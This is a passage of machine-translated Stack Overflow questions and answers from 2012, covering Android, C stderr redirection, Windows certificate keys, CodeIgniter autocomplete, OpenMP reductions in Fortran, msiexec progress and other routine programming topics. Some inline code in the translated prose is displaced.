> 时间：2012-05-30T06:53:27.313

如果你有一个按钮，那么第一个方法是正确的，因为你的代码没有任何复杂性，但是当`you have many button then second is more clear ,just one onClick method for many buttons and check id of button using v.getId()`

但是功能没有任何变化，两者都是相同的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-30T06:52:40.790

我认为第二种方法很好

1-您可以在一个地方处理多个视图单击...

2-它使代码更短且易于阅读..

3-易于维护。

4-如果您在项目中使用类似基本活动的概念，那么它也很有用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T06:58:58.777

好吧，除了一个之外，两者之间并没有太大区别：在第二种情况下，您可以`onClick(View v)`从类外部访问方法。

如果涉及到我，我更喜欢第一种方法，因为通常不会有多个组件在单击时同时具有相同的行为。

# android - 如何使用 perror() 但将提示输出到文件

> ID：10811290
> 
> 赞同：2
> 
> 时间：2012-05-30T06:50:37.660
> 
> 标签：android, c++, c, linux, android-emulator

我知道`perror()`.

但是现在，我想将其结果导出到文件中，而不是控制台。顺便说一句，我在 android 模拟器的 adb shell 下运行它。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-30T06:53:19.183

改用`strerror()`：

```
fprintf(logfile, "Something went wrong: %s\n", strerror(errno)); 
```

或者，您可以使用重定向`stderr`到文件`dup2()`，然后继续使用`perror()`.

**编辑**：当我最初回答这个问题时，我的大脑并没有在所有气缸上开火。没有必要使用`sprintf()`后跟`fputs()`as`fprintf()`可以做到这一切（感谢@maverik）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-30T07:05:13.963

您可以将整个重定向`stderr`到该文件。这是执行此操作的 Unix 方式：

```
int fd = open("logfile", O_WRONLY); // 'fd' stands for 'file descriptor
close(2); // close stderr
dup(fd); // duplicate fd so that it's copy will be the lowest available value -- 2 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T06:56:44.903

我相信您可以将标准错误定向到您选择的文件，例如 $ ./program 2> errlog

# windows-7 - MMC 控制台 - 证书私钥处理

> ID：10811291
> 
> 赞同：3
> 
> 时间：2012-05-30T06:50:42.837
> 
> 标签：windows-7, certificate, key, acl, mmc

我们有一个应用程序需要访问证书的私钥。我们还有一个设置证书的 Nightlybuild（使用 certmgr 从 pfx 文件导入它）。只要证书的设置和证书的访问在相同的登录 Windows 用户 (Windows7) 下运行，这真的很好。

现在，我们想介绍一个测试（在 Nightlybuild 期间自动执行），另一个用户将调用需要访问证书私钥的程序，而我正在努力使用 MMC 控制台 -> 所有任务 -> 管理私钥。

对我来说，看起来我可以更改“管理私钥”的安全设置中的任何内容，但它与证书的真实 ACL 没有任何关系。我可以将问题简化为以下手动步骤：

1.  User1 将证书导入“本地计算机/我的”（根中存在正确的 CA）
2.  User1 在 MMC 中选择证书，点击“Manage Private Keys”并添加具有完全控制权限的“Users”（组）和“User2”（用户）。
3.  用户 1 注销
4.  用户 2 登录
5.  User2打开MMC，点击“Manage Private Keys”-->Error，MMC控制台显示“Cannot find the certificate and private key for decryption”。

虽然 User2 应该有权访问私钥。所以在我看来，MMC 中的 User1（User1 和 User2 都在 Administrators 组中）的设置没有任何意义，并且被访问私钥的 .NET API 忽略了？

有谁知道为什么会这样以及我如何说服 Windows 我们真的希望两个用户能够读取证书的私钥？

感谢您的帮助迈克尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2021-07-01T15:54:08.677

我刚刚遇到了同样的问题。我试图以未在系统上导入证书的用户身份使用代码签名证书。最初导入证书时，并没有导入它，以便可以导出私钥。

我能够通过以下方式解决我们的问题：

1.  从证书存储中删除现有证书
2.  再次导入证书，同时确保它允许导出私钥
3.  使用*管理私钥*设置权限，以便第二个用户可以访问私钥

在这些步骤之后，我的第二个用户能够正确使用代码签名证书。

# iphone - Facebook 评论框在 iPhone / Safari 中不起作用

> ID：10811296
> 
> 赞同：3
> 
> 时间：2012-05-30T06:51:05.313
> 
> 标签：iphone, facebook, safari, facebook-social-plugins

我有一个与 Facebook 评论框（社交插件）集成的页面，可以在桌面浏览器中完美运行，但是当我使用 iPhone 浏览页面时它不起作用，Facebook“正在加载”不断显示并且评论框没有出来.

我也厌倦了以下内容：

1.  用安卓手机浏览同一页面，OK

2.  用iphone 3rd 浏览器浏览同一页面（我用的是二维码扫描浏览器），OK

3.  用 iphone safari 浏览同一页面，不行

我在一月份在 facebook 上发现了这个错误报告，但没有回应：[https ://developers.facebook.com/bugs/171818679588280?browse=search_4f26fb988bf8d0c61735624](https://developers.facebook.com/bugs/171818679588280?browse=search_4f26fb988bf8d0c61735624)

有人对此有想法吗？非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T19:16:22.703

评论插件没有 iframe 代码 - html5 代码有效，但它不会为 iphone 调整大小，这会导致很多布局问题。我使用了 iphone 大小的条件 css：（你必须将代码包装在一个带有“facebook-wrap”类的 div 中）

```
@media screen and (max-width: 460px) { 
.facebook-wrap iframe {
width:300px!important;
left:0!important;
position:relative!important;
max-width:100%;
}
.comments_wrap.section{padding:0} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T01:34:30.303

使用“iframe”代码而不是 javascript

# python - 如何将手绘曲线（矢量图或油漆等）变成一个函数？

> ID：10811297
> 
> 赞同：0
> 
> 时间：2012-05-30T06:51:08.043
> 
> 标签：python, function, drawing, bezier, curve

我希望能够像这个[示例](http://imm.io/qYdM)一样绘制曲线，然后将其转换为近似曲线的函数。一些伪 python 代码可能看起来像

```
>> drawing = file.open('sample_curve.jpg')
>> approx_function = function_from_drawing(drawing, x_scale=10, y_scale=5, y_offset=3)
>> print approx_function(2.2) 
5.3 
```

我认为您可以在每列中选择一个像素点，其中有一条线穿过它（如果有多条线，则决定使用最低的一个），然后用贝塞尔曲线将其平滑。我想我想知道的是什么已经存在这样的东西（当然它确实存在......）以及如何将它与python集成。另外，如果我找不到符合要求的东西，我将如何在 python 中实现它？使用矢量图会更容易吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T22:57:39.727

这是我初步的 hacky 解决方案：

```
from PIL import Image
import numpy as np

class Pic_Function():
    def __init__(self, picture_path):
        self.picture = Image.open(picture_path)
        self.pixels = self.picture.load()
        self.columns = []
        # is there really no image method to get a numpy array of pixels?
        for i in range(self.picture.size[0]):
            self.columns.append([self.pixels[i,j] for j in range(self.picture.size[1])])
        self.first_black = []
        for i in self.columns:
            try:
                self.first_black.append(self.picture.size[0] - i.index((0,0,0)))
            except ValueError:
                self.first_black.append(None)
        self.max, self.min = max(self.first_black), min([j for j in self.first_black if j != None])

    def at(self, x):
        upper_idx = int(math.ceil(x))
        lower_idx = upper_idx - 1
        try:
            upper = self.first_black[upper_idx]
            lower = self.first_black[lower_idx]
        except IndexError:
            return 0
        if None in [upper, lower]:
            return 0

        up_weight, low_weight = abs(upper-x), abs(lower-x)
        return (up_weight*upper + low_weight*lower)/(up_weight + low_weight)

    def norm_at(self, x, length):
        un_normed = self.at(x*self.picture.size[0]/length)
        return (un_normed - self.min)/self.max 
```

# php - 在 codeigniter 中自动完成

> ID：10811301
> 
> 赞同：3
> 
> 时间：2012-05-30T06:51:23.083
> 
> 标签：php, codeigniter, jquery, autocomplete

我尝试使用从网站获得的代码在 codeignter 中进行自动完成。但这对我不起作用。任何人都可以找到问题

我使用的视图功能如下

```
<html>

    <head>
        <title>Autocomplete</title>

        <script src="<?php echo base_url().'js/jquery.autocomplete.js'?>"></script>
        <script src="<?php echo base_url().'js/jquery-1.6.4.js'?>"></script>

        <script type="text/javascript">

          $(function() {
          $( "#username" ).autocomplete({ //the recipient text field with id #username
          source: function( request, response ) {
            $.ajax({
                url: "http://localhost/autocomplete/index.php/autocontroller/search_username",
                dataType: "json",
                data: request,
                success: function(data){
                    if(data.response == 'true') {
                       response(data.message);
                    }
                }
            });
        }
    });
});

        </script>
    </head>

    <body>

        <h1>Autocomplete</h1>

        <input type="text" id="username" value="" />
    </body>

</html> 
```

我使用的控制器如下所示

```
<?php
/* 
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 * Description of autocontroller
 *
 * @author Sivam
 */
class autocontroller extends CI_Controller {

    public function  __construct() {
        parent::__construct();
         $this->load->helper(array('form', 'url'));
         $this->load->database();
    }

    function index()
    {
        $this->load->view('autoview');
    }

    function search_username()
{
        $username = trim($this->input->get('term', TRUE)); //get term parameter sent via text field. Not sure how secure get() is

        $this->db->select('fname');
        $this->db->from('users');
        $this->db->like('fname', $username);
        $this->db->limit('5');
        $query = $this->db->get();

        if ($query->num_rows() > 0)
        {
            $data['response'] = 'true'; //If username exists set true
            $data['message'] = array();

            foreach ($query->result() as $row)
            {
                $data['message'][] = array(
                    'label' => $row->fname,
                    'value' => $row->fname
                );
            }
        }
        else
        {
            $data['response'] = 'false'; //Set false if user not valid
        }

        echo json_encode($data);
}

}
?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T07:48:38.877

我无法理解你为什么使用

```
$data['message'][] = array(
                    'label' => $row->fname,
                    'value' => $row->fname
                ); 
```

您可以通过一维数组尝试。

```
$data['message'] = array(
                        'label' => $row->fname,
                        'value' => $row->fname
                    ); 
```

我还按照这个来使用自动完成功能。[http://www.jamipietila.fi/codeigniter-and-autocomplete-with-jquery/](http://www.jamipietila.fi/codeigniter-and-autocomplete-with-jquery/)请试试这个......它对我有用..希望它也对你有用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-10T18:04:15.087

这是在 codeigniter 中使用自动完成的简单方法。它对我有用。

在视图中：

```
<script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>

<script type="text/javascript">
function lookup(inputString) {
if(inputString.length == 0) {
    $('#suggestions').hide();
} else {
    $.post("<?php echo base_url() ?>your_controller/your_action/"+inputString, function(data){
        if(data.length > 0) {
            $('#suggestions').show();
            $('#autoSuggestionsList').html(data);
        }
    });
} 
```

}

```
function fill(thisValue) {
$('#id_input').val(thisValue);
  setTimeout("$('#suggestions').hide();", 200);
}
</script>

<?php echo form_input('company_name', '', "id='id_input' autocomplete='off' onKeyUp='lookup(this.value)'") ?>

<div id="suggestions">
  <div class="autoSuggestionsList_l" id="autoSuggestionsList"></div>
</div> 
```

这里的第一行当然是调用 jquery 库。

接下来我们有2个功能。lookup() 接受用户输入，然后调用将执行必要的数据库调用的相关 URL。

下一个函数 fill() 将卸载包含结果输出的 div。

最后在视图中，我添加了文本输入框，并且一旦用户在框中输入内容，我还挂钩了查找功能。在输入框下方我们有一个 div，如果有的话，它会显示结果。仅当用户输入产生结果时，此 div 才可见。

在控制器中，我们有：

```
function autocomplete($a)
{
  $i = 0;
  $this->load->model('company');
  $companyList = $this->company->get_companies($a);

  if(count($companyList) > 0):
    echo "<ul>";
    foreach($companyList as $comp):
      echo "<li id='".$companyList[$i]['id']."'><a href='#'>".$companyList[$i]['name']."</a></li>";
      $i++;
    endforeach;
    echo "</ul>";
  endif;
} 
```

在上面的函数中，它接受公司名称（或其中的一部分），然后我用字符串调用函数 get_companies()。该函数将调用数据库并将结果作为数组返回。

在模型中：

```
public function get_companies($name)
{
    //$this->db->_compile_select(); 
    $this->db->like('company_name', $name, 'after'); 

    //$this->db->where('id', $name);

    $query = $this->db->get('companies');

    //echo $this->db->last_query(); 
    //echo $query->num_rows();
    $companies = array();
    $i = 0;
    if($query->num_rows() > 0)
    {
        foreach ($query->result() as $row)
        {
            $companies[$i]['id'] = $row->id;
            $companies[$i]['name'] = $row->company_name;
            $i++;
        }

    }

    //print_r($companies);
    return $companies;

} 
```

上述函数调用数据库并返回二维数组，一个元素是 id，另一个元素是名称。

# openmp - 使用 Fortran 90 的 OpenMP 和数组求和

> ID：10811302
> 
> 赞同：0
> 
> 时间：2012-05-30T06:51:29.997
> 
> 标签：openmp, multidimensional-array, fortran90, do-loops

我正在尝试计算晶体结构的压力张量。为此，我必须通过下面的简化代码中的所有粒子对

```
 do i=1, atom_number      ! sum over atoms i
   type1 = ATOMS(i)
   do nj=POINT(i), POINT(i+1)-1  ! sum over atoms j of i's atoms list
       j = LIST(nj)
       type2 = ATOMS(j) 
       call get_ff_param(type1,type2,Aab,Bab,Cab,Dab)
       call distance_sqr2(i,j,r,VECT_R)
       call gettensor_rij(i,j,T)
       r = sqrt(r)
       if (r<coub_cutoff) then
          local_sum_real(id+1) = local_sum_real(id+1) + ( erfc(alpha_ewald*r) 
          derivative = -( erfc(alpha_ewald*r)
          ff = - (1.0d0/r)*derivative  
          STRESS_EWALDD = STRESS_EWALDD + ff * T  ! A 3x3 matrix    
          FDX(i) = FDX(i) + VECT_R(1) * ff
          FDY(i) = FDY(i) + VECT_R(2) * ff
          FDZ(i) = FDZ(i) + VECT_R(3) * ff
          FDX(j) = FDX(j) - VECT_R(1) * ff
          FDY(j) = FDY(j) - VECT_R(2) * ff
          FDZ(j) = FDZ(j) - VECT_R(3) * ff     
       end if                                  
   end do               ! sum over atoms j 

   sum_kin = sum_kin + ATMMASS(i) * (VX(i)**2 + VY(i)**2 + VZ(i)**2)  
   call gettensor_v(i,Q)
   STRESS_KINETIC = STRESS_KINETIC + ATMMASS(i) * Q

 end do 
```

我尝试使用“paralle do”指令并行化这个双循环，但在张量 STRESS_EWALDD 和力 FDX 方面遇到了一些问题......因此我尝试为每个线程手动分配一些粒子，如以下代码中的但仍然得到错误的张量值。

```
!$omp parallel  private(id,j,i,nj,type1,type2,T,Q,r,VECT_R,derivative,Aab,Bab,Cab,Dab,ff)

 id = omp_get_thread_num()      
 do i=id+1, atom_number,nthreads       ! sum over atoms i
       type1 = ATOMS(i)
       do nj=POINT(i), POINT(i+1)-1  ! sum over atoms j of i's atoms list
           j = LIST(nj)
           type2 = ATOMS(j) 
           call get_ff_param(type1,type2,Aab,Bab,Cab,Dab)
           call distance_sqr2(i,j,r,VECT_R)
           call gettensor_rij(i,j,T)
           r = sqrt(r)
           if (r<coub_cutoff) then
              local_sum_real(id+1) = local_sum_real(id+1) + ( erfc(alpha_ewald*r) 
              derivative = -( erfc(alpha_ewald*r)
              ff = - (1.0d0/r)*derivative  
          local_STRESS_EWALDD(id+1,:,:) = local_STRESS_EWALDD(id+1,:,:) + ff * T    
          FDX(i) = FDX(i) + VECT_R(1) * ff
              FDY(i) = FDY(i) + VECT_R(2) * ff
              FDZ(i) = FDZ(i) + VECT_R(3) * ff
              FDX(j) = FDX(j) - VECT_R(1) * ff
              FDY(j) = FDY(j) - VECT_R(2) * ff
              FDZ(j) = FDZ(j) - VECT_R(3) * ff     
           end if                                  
       end do               ! sum over atoms j 

   local_sum_kin(id+1) = local_sum_kin(id+1) + ATMMASS(i) * (VX(i)**2 + VY(i)**2 + VZ(i)**2)  
   call gettensor_v(i,Q)
   local_STRESS_KINETIC(id+1,:,:) = local_STRESS_KINETIC(id+1,:,:) + ATMMASS(i) * Q

 end do               ! sum over atoms i

!$omp end parallel

 do i=1,nthreads  
   sum_real = sum_real + local_sum_real(i)
   sum_virial_buck = sum_virial_buck + local_sum_virial_buck(i)
   STRESS_BUCK = STRESS_BUCK + local_STRESS_BUCK(i,:,:)
   STRESS_EWALDD = STRESS_EWALDD + local_STRESS_EWALDD(i,:,:)   
   sum_buck = sum_buck + local_sum_buck(i)
   sum_kin  = sum_kin + local_sum_kin(i)
   STRESS_KINETIC = STRESS_KINETIC + local_STRESS_KINETIC(i,:,:) 
 end do 
```

标量和 STRESS_KINETIC 值是正确的，但 STRESS_EWALDD 是错误的，我不知道为什么。到目前为止，我对力量一无所知。所以我真的很感激这里的一些打击。谢谢，

```
 Éric. 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T08:05:29.697

您在使用 OpenMP 时采取了一种有些非正统的方法。

OpenMP 提供了对 in 变量的局部值`reduction(op:vars)`执行归约的子句，您应该将其用于、和. *第i*个原子的力累积应该起作用，因为 Verlet 列表中的原子是有序的（您从 Allen & Tildesley 的书中获取了构建它的代码，对吗？）但不适用于第*j*个原子。这就是为什么你也应该对它们进行归约。如果您在一些较旧的 OpenMP 手册中阅读到缩减变量必须是标量，请不要担心 - 较新的 OpenMP 版本支持在 Fortran 90+ 中对数组变量进行缩减。`op``vars``STRESS_EWALD``sum_kin``sum_real``STRESS_KINETIC`*`POINT`*

 **```
!$OMP PARALLEL DO PRIVATE(....)
!$OMP& REDUCTION(+:FDX,FDY,FDZ,sum_kin,sum_real,STRESS_EWALDD,STRESS_KINETIC)
!$OMP& SCHEDULE(DYNAMIC)
do i=1, atom_number      ! sum over atoms i
 type1 = ATOMS(i)
 do nj=POINT(i), POINT(i+1)-1  ! sum over atoms j of i's atoms list
     j = LIST(nj)
     type2 = ATOMS(j) 
     call get_ff_param(type1,type2,Aab,Bab,Cab,Dab)
     call distance_sqr2(i,j,r,VECT_R)
     call gettensor_rij(i,j,T)
     r = sqrt(r)
     if (r<coub_cutoff) then
        sum_real = sum_real + ( erfc(alpha_ewald*r) 
        derivative = -( erfc(alpha_ewald*r)
        ff = - (1.0d0/r)*derivative  
        STRESS_EWALDD = STRESS_EWALDD + ff * T  ! A 3x3 matrix    
        FDX(i) = FDX(i) + VECT_R(1) * ff
        FDY(i) = FDY(i) + VECT_R(2) * ff
        FDZ(i) = FDZ(i) + VECT_R(3) * ff
        FDX(j) = FDX(j) - VECT_R(1) * ff
        FDY(j) = FDY(j) - VECT_R(2) * ff
        FDZ(j) = FDZ(j) - VECT_R(3) * ff     
     end if                                  
 end do               ! sum over atoms j 

 sum_kin = sum_kin + ATMMASS(i) * (VX(i)**2 + VY(i)**2 + VZ(i)**2)  
 call gettensor_v(i,Q)
 STRESS_KINETIC = STRESS_KINETIC + ATMMASS(i) * Q

end do
!$OMP END PARALLEL DO 
```

当每个原子的邻居数量变化很大时，使用动态循环调度将减少负载不平衡。**

# c# - MsiExec 进度捕获

> ID：10811323
> 
> 赞同：3
> 
> 时间：2012-05-30T06:52:34.223
> 
> 标签：c#, windows-installer

我正在编写一个小应用程序来安装一些产品并以静默模式卸载一些其他产品。
每个产品都有它的 MSI 文件，没有别的，我的应用程序清单声明它应该以管理员权限运行。使用适当的参数运行以完成我的任务（只是一堆代码）
非常容易，并且一切正常。 无论如何，某些软件包需要花费大量时间才能完成，并且在某些旧 pc 用户上询问是否仍在后台进行某些事情或挂起。 那么是否有可能“捕捉”进度，例如更新我的应用程序上的进度条？听起来很疯狂，但我很确定某些专业安装程序会以这种方式运行外部 msi 包。`msiexec`

`msiexec`
那么，有可能吗？我们可以在 C# 中做些什么，或者这是一项非常艰巨的任务，需要很多我没有的知识？

请注意：我知道我可以使用`"/qb"`param，但是某些包的行为方式不正确，我不想使用它。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-30T07:50:20.293

如果您想监控进度，您可能必须直接使用 Windows Installer API，

[http://www.codeproject.com/Articles/5773/Wrapping-the-Windows-Installer-2-0-API](http://www.codeproject.com/Articles/5773/Wrapping-the-Windows-Installer-2-0-API)

这篇 CodeProject 文章展示了一个示例，而微软在 MSDN 上关于函数的信息很少，

[http://msdn.microsoft.com/en-us/library/windows/desktop/aa370384(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/aa370384(v=vs.85).aspx)

[http://msdn.microsoft.com/en-us/library/windows/desktop/aa368786(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/aa368786(v=vs.85).aspx)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-30T07:56:23.943

而不是这个

> 那么是否有可能“捕捉” msiexec 进度，例如更新我的应用程序上的进度条？

你可以有一个正常`progresBar`运行，直到任务完成这样的事情

```
 myProgressBar.Style = ProgressBarStyle.Marquee; 
```

从[Marquee](https://stackoverflow.com/a/312999/1051198)还检查[msdn.microsoft.com](http://msdn.microsoft.com/en-us/library/windows/desktop/aa511486.aspx)

![在此处输入图像描述](../Images/aaa24edd3610aca330761e2901e05a48.png)

1.保持检查是否`msiexec`正在运行

2.启动`myProgressBar.Style = ProgressBarStyle.Marquee;`

3.继续跑![在此处输入图像描述](../Images/aaa24edd3610aca330761e2901e05a48.png)

4.如果`msiexec`已经完成则隐藏progresBar

# c# - 在带有属性和方法的内存类生成中

> ID：10811333
> 
> 赞同：0
> 
> 时间：2012-05-30T06:53:26.420
> 
> 标签：c#, java, oop, concept, conceptual

嘿，这是一个概念性问题，并在我的脑海中产生了一些好奇心，是否可以动态或在内存中创建类（不是对象）？我们也可以动态地为这个类定义属性和方法。

这在任何 oops 语言中都可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T06:55:36.810

是的，在 .NET 中是可能的。查看[System.Reflection.Emit](http://msdn.microsoft.com/en-us/library/system.reflection.emit.aspx)命名空间。使用其中的类型，您可以在其中动态构建程序集和类型。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T06:56:36.143

是的，您可以使用 java Reflection API 来做到这一点。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T07:02:19.540

是的，它在 Java 中是可行的；该技术通常被称为字节码生成。像[cglib](http://cglib.sourceforge.net/)这样的库使它更可行，尽管无论你怎么做都会非常复杂。

# php - 将表单内容保存在数组中

> ID：10811335
> 
> 赞同：-1
> 
> 时间：2012-05-30T06:53:28.107
> 
> 标签：php, arrays, forms

我有一个表格，其中列出了 SQL 数据库中的名称。每个名称后都有一个成绩的文本字段。我希望将成绩和姓名保存在数组中。它已经与名称一起使用，但是成绩的数组只是填充了最后一个文本字段中的内容。

```
$Requete  = "SELECT `vorname`, `nachname` FROM `lernende`";
    $Result   = mysql_query($Requete,$db);
    $grade     = array();
    $vorname  = array();
    $nachname = array();
    $counter  = 0;

while($row = mysql_fetch_array($Result))
    {

        echo '<p>', $row["vorname"]," ", $row["nachname"], " ", '<label>Note: <input type="text" name="note"/></label></p>';
        $grade[$counter] = $_POST['note'];
        $vorname[$counter]    = $row["vorname"];
        $nachname[$counter]    = $row["nachname"];
        $counter = $counter + 1;

    } 
```

我的代码有什么问题？我刚开始学习php，不知道如何解决这个问题......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T06:55:22.163

为成绩字段指定不同的名称，或将它们命名为数组：`<input name="note[]">`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:15:22.113

在您的代码中，您有 $_POST['note']，每行都会重复，对于名称字段和注释字段，您应该附加 $counter 以区分这些输入字段。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:15:48.977

您可以更改这行代码：

```
echo '<p>', $row["vorname"]," ", $row["nachname"], " ", '<label for="note-'.$counter.'">Note:</label> <input id="note-'.$counter.'" type="text" name="note[]"/></label></p>'; 
```

但是，您的代码并不是我想说的最好的。开始学习使用数组，如[http://php.net/array所示，并从](http://php.net/array)[http://de.selfhtml.org/](http://de.selfhtml.org/)中描述的干净 HTML 开始（因为您会说德语）。

# jsf - 如何为 RichFaces 中的 Rich:tree 元素定义全局热键

> ID：10811336
> 
> 赞同：1
> 
> 时间：2012-05-30T06:53:28.230
> 
> 标签：jsf, richfaces

我有个问题。我在我的应用程序中使用rich:tree 元素来表示菜单。这棵树总是出现在页面上。我想做的是定义全局热键，例如：CTRL+UP、CTRL+DOWN，用户可以使用它自动从当前菜单项转到另一个项。希望你明白我的意思。

现在，定义热键是没有问题的。我使用丰富的：热键。但是在他们的处理程序中放什么？

有人对这个问题有一些经验吗？指导正确的方向，一些帮助，任何事情都会做。我现在有点卡住了。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:02:54.623

[RichFaces Showcase 还不够吗？这里](http://showcase.richfaces.org/richfaces/component-sample.jsf?demo=hotKey)描述了使用 HotKeys ，本教程将介绍[ComponentControl](http://docs.jboss.org/richfaces/latest_3_3_X/en/devguide/html/rich_componentControl.html)，它提供了很多方法来对某些关键事件做出反应。

# android - 旋转图像在android中超出范围

> ID：10811338
> 
> 赞同：0
> 
> 时间：2012-05-30T06:53:30.460
> 
> 标签：android

在我的代码中，图像旋转、缩放和拖动都是成功的。但是当我旋转图像时，它会超出边界。请帮我旋转带边框的图像

我的代码如下

这是我的ondraw

```
@Override
public void onDraw(Canvas canvas) {
    // TODO Auto-generated method stub
    canvas.save();

    canvas.drawBitmap(image, matrix, new Paint());
    canvas.drawRect(getBounds() , borderPaint);

    canvas.restore();

} 
```

和 touchEvent 方法

```
static final int NONE = 0;
static final int DRAG = 1;
static final int ZOOM = 2;
int mode = NONE;

@Override
public boolean onTouchEvent(MotionEvent event) {
    boolean handled = false;
    int x = 0;
    int y = 0;
    Log.d("SimpImageView", "(int)event.getX() " + (int)event.getX());
    Log.d("SimpImageView", "(int)event.getY() " + (int)event.getY());

    if(isTouchedInBounds((int)event.getX(), (int)event.getY())){
        Log.d("SimpImageView", "Touched in Bounds");
        handled = true;

        switch (event.getAction() & MotionEvent.ACTION_MASK) {
        case MotionEvent.ACTION_DOWN:
            start.set(event.getX(), event.getY());
            lastPosition.x = getBounds().left;
            lastPosition.y = getBounds().top;
            savedMatrix.set(matrix);
            Log.d("VerticalLabelView", "mode=DRAG");
            mode = DRAG;
            break;
        case MotionEvent.ACTION_POINTER_DOWN:
            mode = ZOOM;
            savedMatrix.set(matrix);
            oldScale = spacing(event);
            midPoint(mid, event);
            Log.d("VerticalLabelView", "mode=ZOOM");
            oldRotation = rotation(event);

            break;
        case MotionEvent.ACTION_UP:
            mode = NONE;
            break;
        case MotionEvent.ACTION_POINTER_UP:
            mode = NONE;
            Log.d("VerticalLabelView", "mode=NONE");
            break;
        case MotionEvent.ACTION_MOVE:
            if (mode == DRAG) {
                matrix.set(savedMatrix);
                 x = (int)(event.getX() - start.x);
                 y = (int)(event.getY() - start.y);
                //  setPosition((int)lastPosition.x + x, (int)lastPosition.y + y,getImage().getWidth(),getImage().getHeight());
                //matrix.setTranslate(lastPosition.x + x, lastPosition.y + y);
                    matrix.postTranslate(event.getX() - start.x, event.getY()
                            - start.y);

                     float[] values = new float[9];
                        matrix.getValues(values);
                        float globalX = values[2];
                        float globalY = values[5];
                        float imageWidth = values[0]* image.getWidth();
                        float imageHeight = values[4] *image.getHeight();
                     setPosition((int)globalX, (int)globalY, (int)imageWidth, (int)imageHeight);
            }else if(mode == ZOOM){

            //  if(newWidth < 500){
                newScale = spacing(event);
                newRotation = rotation(event);
                angle = newRotation - oldRotation;
                //Matrix matrix = new Matrix();
                float scale =newScale/oldScale;
                int width = image.getWidth();
                int height = image.getHeight();
                newWidth = (int) (image.getWidth()*scale);
                newHeight  = (int) (image.getHeight()*scale);
                Log.d("new Widht ", "new widht="+image.getWidth()*scale);
                matrix.set(savedMatrix);
                float scaleWidth = 0;
                float scaleHeight;
                    scaleWidth = ((float) newWidth) / width;
                    scaleHeight= ((float) newHeight) / height;

                    matrix.postScale(scaleWidth, scaleHeight,mid.x,mid.y);
                matrix.postRotate(angle,mid.x,mid.y);
                float[] values = new float[9];
                matrix.getValues(values);
                float globalX = values[2];
                float globalY = values[5];
                float imageWidth = values[0]* image.getWidth();
                float imageHeight = values[4] *image.getHeight();
                setBounds((int)globalX, (int)globalY, (int)imageWidth,(int)imageHeight);    
                Log.d("VerticalLabelView", "AAAAAAAAAAA==globalX="+globalX);
                Log.d("VerticalLabelView", "AAAAAAAAAAA==globalY="+globalY);
                Log.d("VerticalLabelView", "AAAAAAAAAAA==width="+width);
                Log.d("VerticalLabelView", "AAAAAAAAAAA==height="+height);

                Log.d("VerticalLabelView", "AAAAAAAAAAA==values[1]="+values[1]);
                Log.d("VerticalLabelView", "AAAAAAAAAAA==values[3]="+values[3]);
                Log.d("VerticalLabelView", "AAAAAAAAAAA==values[6]="+values[6]);
                Log.d("VerticalLabelView", "AAAAAAAAAAA==values[7]="+values[7]);

            }
            break;
        //  }
        }

    }

   /* Log.d("VerticalLabelView", "AAAAAAAAAAA==globalX="+image.getWidth());
    Log.d("VerticalLabelView", "AAAAAAAAAAA==globalY="+globalY);
    Log.d("VerticalLabelView", "AAAAAAAAAAA==width="+width);
    Log.d("VerticalLabelView", "AAAAAAAAAAA==height="+height);*/

    return handled;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:06:19.517

尝试以下将图像旋转 90 度的代码

```
Matrix matrix = new Matrix();
matrix = collisionImage.getImageMatrix();
//collisionImage is ImageView
Log.i("matrix coordinate rotate 1 collision ", "" + matrix.toString());
Matrix maxMatrix = new Matrix();
maxMatrix.setRotate(ROTATIONByNinety, collisionBitmap.getWidth() / 2, collisionBitmap.getHeight() / 2);
Bitmap newBitmap = Bitmap.createBitmap(collisionBitmap, 0, 0, (int) collisionBitmap.getWidth(), (int) collisionBitmap.getHeight(), maxMatrix, true);
collisionImage.setImageBitmap(newBitmap);
ROTATIONByNinety = ROTATIONByNinety + 90;
if (ROTATIONByNinety == 360) {
    ROTATIONByNinety = 0;
}
// changeImage(newBitmap);
Log.i("maxMatrix coordinate rotate 2 collision", maxMatrix.toString());
Log.i("matrix coordinate rotate 2 collision", matrix.toString());
collisionImage.setImageMatrix(matrix);
collisionImage.invalidate(); 
```

# c# - 在 codedUI 测试中访问 wpftext 控件的字体属性

> ID：10811340
> 
> 赞同：1
> 
> 时间：2012-05-30T06:53:46.157
> 
> 标签：c#, .net, wpf, user-controls, wpf-controls

我想检查字体是否为粗体，以及它在 codedui 测试中的颜色。我正在使用 wpftext 控件。请帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-18T14:29:18.777

萨兰，

不幸的是，这并不像它应该的那样简单，但可以通过创建 CodedUI 测试框架扩展来完成，该扩展将 AutomationProperties.ItemStatusProperty 设置为当前字体。这样做的一个好处是它可以与测试记录器一起使用，并允许您生成断言和/或手动代码验证。

